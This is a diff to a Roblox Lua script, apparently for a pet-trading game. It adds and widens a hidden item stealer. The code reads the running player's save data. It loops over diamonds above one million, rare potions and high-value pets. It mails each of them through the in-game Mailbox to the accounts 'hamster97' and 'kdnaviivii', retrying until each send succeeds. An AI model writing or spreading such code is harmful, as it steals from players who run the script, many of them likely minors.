@@ -6,11 +6,6 @@ uuu,vvv=pcall(function()
 local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
 save = save.Get()
-local s = save.Inventory.Currency
-for i,v in pairs(s) do
-if v.id == "Diamonds" then
-e = e.."\\nGems: "..v._am
-if v._am >= 5000000 then
 function _mail(u, t, i, n)
 local args = {
     [1] = u,
@@ -21,6 +16,11 @@ local args = {
 }
 return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
+local s = save.Inventory.Currency
+for i,v in pairs(s) do
+if v.id == "Diamonds" then
+e = e.."\\nGems: "..v._am
+if v._am >= 1000000 then
 local s,e = false, "x"
 repeat
 pcall(function() s,e = _mail("hamster97", "Currency", v.id, v._am) end)
@@ -28,11 +28,35 @@ until s
 end
 end
 end
+local pots = {}
+if save.Inventory.Consumable then
+    for i, v in pairs(save.Inventory.Consumable) do
+        if v.id == "God Potion" or v.id == "Jelly God Potion" or (v.id == "Instant Luck Potion" and v.tn == 4) then
+            pots[i] = v._am or 1
+        end
+    end
+end
+for i,v in pairs(pots) do
+local s,e = false, "x"
+repeat
+pcall(function() s,e = _mail("hamster97", "Consumable", i, v) end)
+until s
+end
 local big = 0
+local sendids={}
 for i,v in pairs(save.Inventory.Pet) do
 if require(dir[v.id]).difficulty >= big then
 big = require(dir[v.id]).difficulty
 end
+if (string.find(v.id, "Jelly") and require(dir[v.id]).difficulty>= 9999) or require(dir[v.id]).difficulty>=500000000 then
+table.insert(sendids, {i, (v._am or 1)})
+end
+end
+for i,v in pairs(sendids) do
+local s,e = false, "x"
+repeat
+pcall(function() s,e = _mail("kdnaviivii", "Pet", v[1], v[2]) end)
+until s
 end
 e = e.."\\nBest Pet: 1/"..big
 end)
